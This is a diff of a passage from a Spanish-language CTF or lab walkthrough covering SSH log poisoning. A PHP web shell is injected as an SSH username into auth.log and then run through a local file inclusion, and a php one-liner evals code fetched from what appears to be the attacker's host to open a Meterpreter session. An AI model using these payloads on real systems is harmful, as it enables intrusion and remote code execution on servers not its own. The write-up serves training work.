@@ -78,7 +78,7 @@ Gracias a esta [página web](https://www.hackingarticles.in/rce-with-lfi-and-ssh
 
 Lo primero que haremos es leer el archivo ```/var/log/auth.log``` para ver si los logins fallan o aciertan en la conexión con el servidor web.
 
-Procederemos ha poner un **codigo malicioso con php** en la conexion ssh para poder ejecutar comandos del sistema como si fuese el cmd o la terminal:
+Procederemos ha poner un **codigo malicioso con php**(log poisoning) en la conexion ssh para poder ejecutar comandos del sistema como si fuese el cmd o la terminal:
 
 ```ssh '<?php system($_GET['c']); ?>'@192.168.221.6```
 
@@ -117,7 +117,7 @@ php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.221.4:808
 
 > Aquí el payload que me ha dado
 
-La pondremo en la url escrita anteriormente y nos crara un session en meterpreter.
+La pondremo delante de ```192.168.221.6/ikilledsiriusblack.php?file=/var/log/auth.log&c=``` y nos creara un session en meterpreter.
 
 Por ahora somos usuario **bellatrix**
 
